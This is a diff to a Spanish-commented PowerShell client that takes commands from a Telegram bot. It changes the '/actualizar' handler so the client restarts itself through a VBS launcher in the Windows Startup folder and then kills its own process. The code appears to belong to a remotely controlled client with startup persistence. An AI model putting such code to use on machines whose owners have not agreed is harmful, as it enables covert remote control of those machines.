@@ -149,22 +149,24 @@ while ($true) {
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                             continue
                         }
-                                                "/actualizar" {
-                            $Respuesta = "🔄 Actualizando script en ID $MiIDNum... Recargando archivo en limpio."
+                                                              "/actualizar" {
+                            $Respuesta = "🔄 Cerrando proceso actual y ejecutando iniciar_cliente.vbs en ID $MiIDNum..."
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
                             
-                            # 1. Espera un segundo para que el mensaje de Telegram salga correctamente
+                            # 1. Espera un segundo para asegurar que el mensaje de Telegram se envíe completo
                             Start-Sleep -Seconds 1
                             
-                            # 2. Detecta automáticamente la ruta exacta de este archivo cliente.ps1
-                            $RutaScriptActual = $MyInvocation.MyCommand.Path
+                            # 2. Busca tu lanzador en la carpeta de Inicio de tu usuario y lo ejecuta
+                            $RutaInicio = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\iniciar_cliente.vbs"
+                            if (Test-Path $RutaInicio) {
+                                Start-Process "wscript.exe" -ArgumentList "`"$RutaInicio`""
+                            }
                             
-                            # 3. Fuerza a la ventana actual a leer el nuevo código del disco duro inmediatamente
-                            & $RutaScriptActual
-                            
-                            # 4. Rompe el bucle de memoria viejo para que no deje procesos colgados
+                            # 3. Hace el 'taskkill' de sí mismo de forma segura para liberar la memoria vieja
+                            Stop-Process -Id $PID -Force
                             continue
                         }
+
 
 
                         "/notepad" {
